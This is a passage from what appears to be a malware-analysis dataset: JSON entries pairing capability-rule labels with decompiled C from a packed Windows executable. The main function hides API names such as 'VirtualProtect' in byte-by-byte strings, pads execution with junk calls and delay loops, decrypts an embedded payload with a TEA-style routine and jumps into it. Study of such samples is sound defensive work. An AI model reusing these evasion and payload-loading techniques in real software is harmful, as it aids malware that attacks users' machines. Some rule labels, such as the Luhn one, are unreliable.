{
    "00401019": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401019(int32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint hFindFile;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint var_11h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    for (var_18h = 0; var_18h < 0x8b2013; var_18h = var_18h + 1) {\n        if (var_18h == 0x86c4dc) {\n            var_ch = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0, *arg_ch);\n        }\n    }\n    var_8h = 0;\n    for (var_1ch = 0; var_1ch < *arg_ch; var_1ch = var_1ch + 4) {\n        uVar1 = *(*arg_8h + var_1ch);\n        uVar2 = *(var_1ch + 1 + *arg_8h);\n        uVar3 = *(var_1ch + 2 + *arg_8h);\n        uVar4 = *(var_1ch + 3 + *arg_8h);\n        if (*0x4e2d24 == 0xa5e) {\n            (*_sym.imp.KERNEL32.dll_FindClose)(0);\n            (*_sym.imp.KERNEL32.dll_GetFileTime)(0, 0, 0, 0);\n        }\n        *(var_ch + var_8h) = uVar1 | (uVar4 & 0x30) << 2;\n        *(var_ch + var_8h + 1) = uVar2 | (uVar4 & 0xc) << 4;\n        *(var_ch + var_8h + 2) = uVar3 | uVar4 << 6;\n        var_8h = var_8h + 3;\n    }\n    *arg_8h = var_ch;\n    *arg_ch = var_8h;\n    return;\n}\n",
        "token_count": 538
    },
    "0040101e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040101e(uint32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_3ch = *arg_8h;\n    var_14h = arg_8h[1];\n    var_20h = -0x3910c8e0;\n    for (var_ch = 0; var_ch < 0x20; var_ch = var_ch + 1) {\n        var_14h = var_14h - (var_3ch * 0x10 + arg_ch[2] ^ var_3ch + var_20h ^ (var_3ch >> 5) + arg_ch[3]);\n        var_3ch = var_3ch - (var_14h * 0x10 + *arg_ch ^ var_14h + var_20h ^ (var_14h >> 5) + arg_ch[1]);\n        var_20h = var_20h + 0x61c88647;\n    }\n    *arg_8h = var_3ch;\n    arg_8h[1] = var_14h;\n    return;\n}\n",
        "token_count": 391
    },
    "null": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nuint main(void)\n\n{\n    uint unaff_EBX;\n    uint var_96ch;\n    uint var_968h;\n    int32_t var_964h;\n    uint var_960h;\n    uint32_t var_95ch;\n    int32_t var_958h;\n    int32_t var_93ch;\n    int32_t var_930h;\n    int32_t var_92ch;\n    uint var_928h;\n    uint var_524h;\n    uint var_520h;\n    uint var_51ch;\n    uint var_518h;\n    uint var_514h;\n    uint var_510h;\n    uint var_50ch;\n    uint var_508h;\n    uint var_504h;\n    uint var_500h;\n    uint var_4fch;\n    uint var_4f8h;\n    uint var_4f4h;\n    uint var_4f0h;\n    uint var_4ech;\n    uint var_4e8h;\n    uint var_4e4h;\n    uint var_4e0h;\n    uint var_4dch;\n    uint var_4d8h;\n    uint var_4d4h;\n    uint var_4d0h;\n    uint var_4cch;\n    uint var_4c8h;\n    uint var_4c4h;\n    uint var_4c0h;\n    uint var_4bch;\n    uint var_4b8h;\n    uint var_4b4h;\n    uint var_4b0h;\n    uint var_4ach;\n    uint var_4a8h;\n    uint var_4a4h;\n    uint var_4a0h;\n    uint var_49ch;\n    uint var_498h;\n    uint var_494h;\n    uint var_490h;\n    uint var_48ch;\n    uint var_488h;\n    uint var_484h;\n    uint var_480h;\n    uint var_47ch;\n    uint var_478h;\n    uint var_474h;\n    uint var_470h;\n    uint var_46ch;\n    uint var_468h;\n    uint var_464h;\n    uint var_460h;\n    uint var_45ch;\n    uint var_458h;\n    uint var_454h;\n    uint var_450h;\n    uint var_44ch;\n    uint var_448h;\n    uint var_444h;\n    uint var_440h;\n    uint var_43ch;\n    uint var_438h;\n    uint var_434h;\n    uint var_430h;\n    uint var_42ch;\n    uint var_428h;\n    uint var_424h;\n    uint var_420h;\n    uint var_41ch;\n    uint var_418h;\n    uint var_414h;\n    uint var_410h;\n    uint var_40ch;\n    uint var_408h;\n    uint var_404h;\n    uint var_400h;\n    uint var_3fch;\n    uint var_3f8h;\n    uint var_3f4h;\n    uint var_3f0h;\n    uint var_3ech;\n    uint var_3e8h;\n    uint var_3e4h;\n    uint var_3e0h;\n    uint var_3dch;\n    uint var_3d8h;\n    uint var_3d4h;\n    uint var_3d0h;\n    uint var_3cch;\n    uint var_3c8h;\n    uint var_3c4h;\n    uint var_3c0h;\n    uint var_3bch;\n    uint var_3b8h;\n    uint var_3b4h;\n    uint var_3b0h;\n    uint var_3ach;\n    uint var_3a8h;\n    uint var_3a4h;\n    uint var_3a0h;\n    uint var_39ch;\n    uint var_398h;\n    uint var_394h;\n    uint var_390h;\n    uint var_38ch;\n    uint var_388h;\n    uint var_384h;\n    int32_t var_380h;\n    uint var_37ch;\n    uint var_378h;\n    uint var_374h;\n    uint var_370h;\n    uint var_36ch;\n    uint var_368h;\n    uint var_364h;\n    uint var_360h;\n    uint var_35ch;\n    uint var_358h;\n    uint var_354h;\n    uint var_350h;\n    uint var_34ch;\n    uint var_348h;\n    uint var_344h;\n    uint var_340h;\n    uint var_33ch;\n    uint var_338h;\n    uint var_334h;\n    uint var_330h;\n    uint var_32ch;\n    uint var_328h;\n    uint var_324h;\n    uint var_320h;\n    uint var_31ch;\n    uint var_318h;\n    uint var_314h;\n    uint var_310h;\n    uint var_30ch;\n    uint var_308h;\n    uint var_304h;\n    uint var_300h;\n    uint var_2fch;\n    uint var_2f8h;\n    uint var_2f4h;\n    uint var_2f0h;\n    uint var_2ech;\n    uint var_2e8h;\n    uint var_2e4h;\n    uint var_2e0h;\n    uint var_2dch;\n    uint var_2d8h;\n    uint var_2d4h;\n    uint var_2d0h;\n    uint var_2cch;\n    uint var_2c8h;\n    uint var_2c4h;\n    uint var_2c0h;\n    uint var_2bch;\n    uint var_2b8h;\n    uint var_2b4h;\n    uint var_2b0h;\n    uint var_2ach;\n    uint var_2a8h;\n    uint var_2a4h;\n    uint var_2a0h;\n    uint var_29ch;\n    uint var_298h;\n    uint var_294h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_250h;\n    uint var_24ch;\n    uint var_248h;\n    uint var_244h;\n    uint var_240h;\n    uint var_23ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x4e2d24 == 0x64d0b) {\n        fcn.0043cd0e(0x459e60, \"Zabatarilerudobor cokexunovarolox kiwuwoferivisabogidu\", unaff_EBX);\n        fcn.0043cd0e(0, 0, unaff_EBX);\n    }\n    *0x4dddec = 0x65;\n    *0x4dddf2 = 0x6c;\n    *0x4dddf0 = 0x2e;\n    *0x4dddeb = 0x6e;\n    *0x4dddee = 0x33;\n    *0x4ddde9 = 0x65;\n    *0x4ddded = 0x6c;\n    *0x4dddf1 = 100;\n    *0x4dddf3 = 0x6c;\n    *0x4dddef = 0x32;\n    *0x4dddea = 0x72;\n    *0x4ddde8 = 0x6b;\n    *0x4dddf4 = 0;\n    var_ch = *0x4e2164;\n    *0x4df92a = 0x68;\n    *0x4df925 = 0x65;\n    *0x4df928 = 0x6f;\n    *0x4df927 = 0x6f;\n    *0x4df920 = 0x43;\n    *0x4df924 = 0x74;\n    *0x4df929 = 0x6c;\n    *0x4df92f = 0x32;\n    *0x4df92c = 0x6c;\n    *0x4df935 = 0x68;\n    *0x4df933 = 0x70;\n    *0x4df92e = 0x33;\n    *0x4df930 = 0x53;\n    *0x4df937 = 0x74;\n    *0x4df931 = 0x6e;\n    *0x4df936 = 0x6f;\n    *0x4df923 = 0x61;\n    *0x4df926 = 0x54;\n    *0x4df932 = 0x61;\n    *0x4df934 = 0x73;\n    *0x4df922 = 0x65;\n    *0x4df92d = 0x70;\n    *0x4df92b = 0x65;\n    *0x4df921 = 0x72;\n    *0x4df938 = 0;\n    *0x4dc11e = 0x33;\n    *0x4dc11a = 100;\n    *0x4dc11b = 0x75;\n    *0x4dc11f = 0x32;\n    *0x4dc122 = 0x72;\n    *0x4dc125 = 0x57;\n    *0x4dc11c = 0x6c;\n    *0x4dc120 = 0x46;\n    *0x4dc118 = 0x4d;\n    *0x4dc123 = 0x73;\n    *0x4dc124 = 0x74;\n    *0x4dc11d = 0x65;\n    *0x4dc119 = 0x6f;\n    *0x4dc121 = 0x69;\n    *0x4dc126 = 0;\n    var_4h = 0xffffffff;\n    var_8h = 0;\n    if (*0x4e2d24 == 0x6016e) {\n        (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(0, 0);\n        (*_sym.imp.KERNEL32.dll_EnumTimeFormatsW)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_GetStringTypeExA)\n                  (0, 0, \"Vixamopelito xalelibedopo secuwaja socifirufipe manefu\", 0, &var_524h);\n        (*_sym.imp.KERNEL32.dll_FormatMessageA)(0, 0, 0, 0, &var_928h, 0, 0);\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(0, 0);\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(0, 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_MoveFileWithProgressA)(\"Haromubijabi sajete\", \"Wodo seye bi pahawu rifita\", 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_Sleep)(0);\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(0, 0);\n        (*_sym.imp.MSIMG32.dll_GradientFill)(0, 0, 0, 0, 0, 0);\n        fcn.0043cc7a(0);\n        fcn.0043cbfb(0, 0);\n    }\n    for (var_92ch = 0; var_92ch < 0x301c8ffd; var_92ch = var_92ch + 1) {\n        (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (0x3184bb < var_92ch) {\n            (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(0);\n        }\n        if ((0xf65b1 < var_92ch) && (((var_930h != 0x60051d89 || (var_930h >> 0x1f != 2)) && (var_93ch != 0x66729f13))))\n        break;\n    }\n    fcn.00401028();\n    var_380h = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0, *0x4e2d24);\n    for (var_958h = 0; var_958h < 0x7aa767; var_958h = var_958h + 1) {\n        if (var_958h == 0x3f80ed) {\n            *0x4e2ec4 = *0x458a84;\n            *0x4dc114 = var_380h;\n        }\n    }\n    for (var_95ch = 0; var_95ch < *0x4e2d24; var_95ch = var_95ch + 1) {\n        *(*0x4dc114 + var_95ch) = *(*0x4e2ec4 + var_95ch + 0x8f176);\n    }\n    fcn.00401019(0x4dc114, 0x4e2d24);\n    *0x4e5d18 = *0x4e5d18 + 0x40;\n    *0x45b090 = 0x6b;\n    *0x45b099 = 100;\n    *0x45b091 = 0x65;\n    *0x45b095 = 0x6c;\n    *0x45b097 = 0x32;\n    *0x45b09a = 0x6c;\n    *0x45b098 = 0x2e;\n    *0x45b092 = 0x72;\n    *0x45b096 = 0x33;\n    *0x45b094 = 0x65;\n    *0x45b09b = 0x6c;\n    *0x45b093 = 0x6e;\n    *0x45b09c = 0;\n    for (var_964h = 0; var_964h < 0x65353; var_964h = var_964h + 1) {\n        if (var_964h == 0x24779) {\n            *0x4e2164 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(L\"kernel32.dll\");\n        }\n    }\n    *0x4e2d2a = 0x72;\n    *0x4e2d35 = 0x74;\n    *0x4e2d2d = 0x61;\n    *0x4e2d31 = 0x6f;\n    *0x4e2d33 = 0x65;\n    *0x4e2d2b = 0x74;\n    *0x4e2d29 = 0x69;\n    *0x4e2d28 = 0x56;\n    *0x4e2d30 = 0x72;\n    *0x4e2d2f = 0x50;\n    *0x4e2d2c = 0x75;\n    *0x4e2d2e = 0x6c;\n    *0x4e2d34 = 99;\n    *0x4e2d32 = 0x74;\n    *0x4e2d36 = 0;\n    fcn.00401014();\n    var_514h = 0x3ab1e315;\n    var_264h = 0x11ec0f70;\n    var_290h = 0x4cdaf16;\n    var_324h = 0x6c5a8c6c;\n    var_3c4h = 0x1dda535e;\n    var_320h = 0x5d730d7c;\n    var_49ch = 0x4da4ace2;\n    var_3b8h = 0x41b5d805;\n    var_284h = 0x359bbdbe;\n    var_2f4h = 0x79a63980;\n    var_418h = 0x1cac7cb7;\n    var_3f0h = 0x6dc2e6bc;\n    var_494h = 0x4ebb7a2c;\n    var_474h = 0x3ab95aa;\n    var_470h = 0x46420dbc;\n    var_414h = 0x585e837f;\n    var_438h = 0x11cf6407;\n    var_318h = 0x537eb3b6;\n    var_314h = 0x474d7cea;\n    var_504h = 0x21ed2648;\n    var_3b4h = 0x2fc6e1e6;\n    var_254h = 0x56db700d;\n    var_368h = 0x490f0a5f;\n    var_410h = 0x6d5c0fc0;\n    var_250h = 0x27fe988b;\n    var_30ch = 0x75646b5f;\n    var_390h = 0x4c5a17cb;\n    var_464h = 0x2e81407e;\n    var_308h = 0x5d52b3d3;\n    var_38ch = 0x1dd42843;\n    var_2b4h = 0x3ec16a7;\n    var_40ch = 0x2d70c3bd;\n    var_460h = 0x2f6f18d6;\n    var_45ch = 0x42f1e318;\n    var_4cch = 0x5e8ca6fe;\n    var_304h = 0x4bdd661b;\n    var_2e0h = 0x37212cf4;\n    var_4c8h = 0x6672fd7c;\n    var_434h = 0x67282b0c;\n    var_4c4h = 0x77536d2c;\n    var_48ch = 0x2bb6aa62;\n    var_430h = 0x1e2e72f2;\n    var_408h = 0x5ee3117b;\n    var_2a8h = 0x6c4d275b;\n    var_4c0h = 0x429ac70f;\n    var_4bch = 0x7b736a5e;\n    var_338h = 0x4afcce45;\n    var_334h = 0x1d13132e;\n    var_2d4h = 0xf15623e;\n    var_300h = 0x5ab478fa;\n    var_404h = 0x60697e96;\n    var_248h = 0x5d76176c;\n    var_27ch = 0x58bf3d2d;\n    var_3ach = 0x190c9212;\n    var_4b8h = 0x3763000b;\n    var_244h = 0x19e5f369;\n    var_330h = 0x1163dbca;\n    var_428h = 0x556f1ea2;\n    var_274h = 0x4b6bb0f8;\n    var_2a4h = 0x3859356;\n    var_360h = 0x1c73cef7;\n    var_384h = 0x5993216b;\n    var_458h = 0x2a40277f;\n    var_454h = 0x33aef21e;\n    var_35ch = 0x7111fc5e;\n    var_2d0h = 0x550c9878;\n    var_3e0h = 0x2401805b;\n    var_400h = 0x62d2d24b;\n    var_4f4h = 0x361da6a1;\n    var_2fch = 0x13eabe52;\n    var_424h = 0x6bbe98c1;\n    var_450h = 0x2f915490;\n    var_3d8h = 0x7d43d361;\n    var_3d4h = 0x678af443;\n    var_4b0h = 0x7d8e2615;\n    var_23ch = 0x417aa32d;\n    var_2a0h = 0x37b1a4f3;\n    var_44ch = 0x1b9c577b;\n    var_448h = 0x9a04bf5;\n    var_4ach = 0x65c6d12f;\n    var_2cch = 0x1a720cde;\n    var_3fch = 0x3018910f;\n    var_484h = 0x781cd790;\n    var_4e8h = 0x341d0641;\n    var_2f8h = 0x9bba8134;\n    var_420h = 0xdfd30f7a;\n    var_358h = 0x7f9731;\n    var_480h = 0x58340705;\n    var_354h = 0x9cce1e0c;\n    var_3cch = 0x2d895f9;\n    var_444h = 0x957dd823;\n    var_3a0h = 0xfc73375f;\n    var_488h = 0xae594f94;\n    var_51ch = 0x29f235d4;\n    var_478h = 0x16109320;\n    var_41ch = 0xb34a0b01;\n    var_25ch = 0xe5c34f2b;\n    var_2c8h = 0xf6354d03;\n    var_490h = 0x38d42b89;\n    var_4dch = 0x1c138fe5;\n    var_510h = 0xdaeddcde;\n    var_2bch = 0x9daf8d69;\n    var_440h = 0x21fff8e1;\n    var_4d4h = 0xe85d0b8b;\n    var_31ch = 0x50bf23a0;\n    var_2b8h = 0x3ec83927;\n    var_468h = 0xc6679cf7;\n    var_3f4h = 0x388a2218;\n    var_4d0h = 0x62bef5e;\n    var_520h = 0xf667ec0e;\n    var_29ch = 0x7081fb81;\n    var_3e8h = 0x2db05a2e;\n    var_518h = 0xebab93a1;\n    var_310h = 0xa180c55b;\n    var_370h = 0x7705e01f;\n    var_2c0h = 0x3b3f576d;\n    var_364h = 0x6389ecff;\n    var_26ch = 0xaa2ba4e6;\n    var_50ch = 0xa3b53728;\n    var_3bch = 0x31418c32;\n    var_3b0h = 0xcf8ac1c6;\n    var_3a4h = 0x63133d52;\n    var_350h = 0x103fbb33;\n    var_288h = 0xdeb835b7;\n    var_374h = 0x44dc8e84;\n    var_3ech = 0x34caf9b1;\n    var_2ech = 0x1b357f5e;\n    var_268h = 0x908e45d1;\n    var_2f0h = 0x3f210c93;\n    var_33ch = 0xf9e4b2ef;\n    var_2e4h = 0xba7670b6;\n    var_43ch = 0x7d0ab579;\n    var_28ch = 0x5c031849;\n    var_2e8h = 0x579e5cdc;\n    var_3a8h = 0x10d788ba;\n    var_260h = 0xe5adeedc;\n    var_24ch = 0xdb50ea16;\n    var_3c0h = 0xf95cfc53;\n    var_298h = 0xe2f68f3;\n    var_4ech = 0x1f355f7d;\n    var_340h = 0x2d7daa5e;\n    var_2c4h = 0x98093969;\n    var_42ch = 0x5b7f747;\n    var_34ch = 0xcc57a48d;\n    var_398h = 0x442d5382;\n    var_4f0h = 0x93e7ceea;\n    var_500h = 0xdac9426d;\n    var_46ch = 0xcb5140ec;\n    var_2d8h = 0x7fb5ba5f;\n    var_3e4h = 0xe4cc5f66;\n    var_4e4h = 0x3388123a;\n    var_508h = 0xf6cf2e74;\n    var_258h = 0x40ecf0f3;\n    var_270h = 0xab04096e;\n    var_3d0h = 0x54434f39;\n    var_378h = 0x65685833;\n    var_328h = 0xb21efcd6;\n    var_2ach = 0x2dd7ae86;\n    var_4f8h = 0xf439dfa6;\n    var_2dch = 0xe38ee7b;\n    var_240h = 0x90db8a77;\n    var_37ch = 0x719edac9;\n    var_388h = 0xc3380004;\n    var_3f8h = 0xc1b9422b;\n    var_344h = 0x530e055d;\n    var_47ch = 0x59c30d7e;\n    var_4a4h = 0x3c553e2a;\n    var_39ch = 0xb9b16ad3;\n    var_4a0h = 0x6c57d02;\n    var_278h = 0x305c9bc5;\n    var_394h = 0x4a32d5f3;\n    var_4b4h = 0xb5646cb;\n    var_3dch = 0x75abe51e;\n    var_498h = 0xe563d430;\n    var_4d8h = 0x4d9174ab;\n    var_280h = 0x4e37bef4;\n    var_4a8h = 0x114c3cbd;\n    var_2b0h = 0x4698cbaf;\n    var_4e0h = 0xefedd962;\n    var_3c8h = 0x26b2f7b5;\n    var_4fch = 0x2d3996b0;\n    var_294h = 0xb846dfa3;\n    var_36ch = 0xa6c0fb65;\n    var_348h = 0x34eba593;\n    var_32ch = 0x738a618c;\n    fcn.0040100a(*0x4dc114, *0x4e2d24, 0x458000);\n    *0x4dc114 = fcn.0040100f(*0x4dc114);\n    (**0x4dc114)();\n    return 0;\n}\n",
        "token_count": 6503
    },
    "0043d410": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0043d516: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0043d51b)\n// WARNING: Removing unreachable block (ram,0x0043d54a)\n// WARNING: Removing unreachable block (ram,0x0043d521)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0043d410(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t unaff_EBP;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0043fb70(0x457210, 0x20);\n    fcn.0043ffbc(8);\n    *(unaff_EBP + -4) = 0;\n    pcVar1 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if (*0x501d1c != 1) {\n        *0x501d18 = 1;\n        *0x501d14 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x503f54);\n            *(unaff_EBP + -0x30) = piVar2;\n            if (piVar2 != NULL) {\n                piVar3 = (*pcVar1)(*0x503f50);\n                *(unaff_EBP + -0x2c) = piVar3;\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x28) = piVar3;\n                while( true ) {\n                    piVar3 = piVar3 + -1;\n                    *(unaff_EBP + -0x2c) = piVar3;\n                    if (piVar3 < piVar2) break;\n                    iVar4 = fcn.0043f640();\n                    if (*piVar3 != iVar4) {\n                        if (piVar3 < piVar2) break;\n                        pcVar5 = (*pcVar1)(*piVar3);\n                        iVar4 = fcn.0043f640();\n                        *piVar3 = iVar4;\n                        (*pcVar5)();\n                        iVar4 = (*pcVar1)(*0x503f54);\n                        piVar2 = (*pcVar1)(*0x503f50);\n                        if ((*(unaff_EBP + -0x24) != iVar4) || (*(unaff_EBP + -0x28) != piVar2)) {\n                            *(unaff_EBP + -0x24) = iVar4;\n                            *(unaff_EBP + -0x30) = iVar4;\n                            *(unaff_EBP + -0x28) = piVar2;\n                            *(unaff_EBP + -0x2c) = piVar2;\n                            piVar3 = piVar2;\n                        }\n                        piVar2 = *(unaff_EBP + -0x30);\n                    }\n                }\n            }\n            *(unaff_EBP + -0x1c) = 0x453630;\n            while (*(unaff_EBP + -0x1c) < 0x45393c) {\n                if (**(unaff_EBP + -0x1c) != NULL) {\n                    (***(unaff_EBP + -0x1c))();\n                }\n                *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n            }\n        }\n        *(unaff_EBP + -0x20) = 0x453a40;\n        while (*(unaff_EBP + -0x20) < 0x453b44) {\n            if (**(unaff_EBP + -0x20) != NULL) {\n                (***(unaff_EBP + -0x20))();\n            }\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 4;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0043fecb(8);\n    }\n    return;\n}\n",
        "token_count": 1016
    },
    "0044053b": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0044053b(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.0043fecb(0);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "00440b6b": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00440b6b(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint unaff_EBX;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x458fe0 ^ &stack0xfffffffc;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    var_18h = fcn.0043f640();\n    var_14h = 0;\n    if (*0x5026e8 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(L\"USER32.DLL\");\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar1 == 0) ||\n           (iVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"MessageBoxW\"), \n           pcVar4 = _sym.imp.KERNEL32.dll_EncodePointer,  iVar2 == 0)) goto code_r0x00440cc8;\n        *0x5026e8 = (*_sym.imp.KERNEL32.dll_EncodePointer)(iVar2);\n        uVar3 = (*pcVar6)(iVar1, \"GetActiveWindow\");\n        *0x5026ec = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, \"GetLastActivePopup\");\n        *0x5026f0 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, \"GetUserObjectInformationW\");\n        *0x5026f8 = (*pcVar4)(uVar3);\n        if (*0x5026f8 != 0) {\n            uVar3 = (*pcVar6)(iVar1, \"GetProcessWindowStation\");\n            *0x5026f4 = (*pcVar4)(uVar3);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if ((*0x5026f4 == var_18h) || (*0x5026f8 == var_18h)) {\ncode_r0x00440c77:\n        if ((((*0x5026ec != var_18h) && (pcVar4 = (*pcVar6)(*0x5026ec),  pcVar4 != NULL)) &&\n            (var_14h = (*pcVar4)(),  var_14h != 0)) &&\n           ((*0x5026f0 != var_18h && (pcVar4 = (*pcVar6)(*0x5026f0),  pcVar4 != NULL)))) {\n            var_14h = (*pcVar4)(var_14h);\n        }\n    }\n    else {\n        pcVar4 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x5026f4);\n        pcVar5 = (*pcVar6)(*0x5026f8);\n        if (((pcVar4 == NULL) || (pcVar5 == NULL)) ||\n           (((iVar1 = (*pcVar4)(),  iVar1 != 0 && (iVar1 = (*pcVar5)(iVar1, 1, &var_10h, 0xc, &var_24h),  iVar1 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x00440c77;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x5026e8);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(var_14h, var_20h, var_1ch, arg_10h);\n    }\ncode_r0x00440cc8:\n    fcn.00440ee5(unaff_EBX);\n    return;\n}\n",
        "token_count": 942
    },
    "00440ee5": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00440ee5(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x458fe0) {\n        return;\n    }\n    *0x502840 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x502844 = &arg_8h;\n    *0x502780 = 0x10001;\n    *0x502728 = 0xc0000409;\n    *0x50272c = 1;\n    var_328h = *0x458fe0;\n    var_324h = *0x458fe4;\n    *0x502734 = unaff_retaddr;\n    *0x50280c = in_GS;\n    *0x502810 = in_FS;\n    *0x502814 = in_ES;\n    *0x502818 = in_DS;\n    *0x50281c = unaff_EDI;\n    *0x502820 = unaff_ESI;\n    *0x502824 = unaff_EBX;\n    *0x502828 = in_EDX;\n    *0x50282c = in_ECX;\n    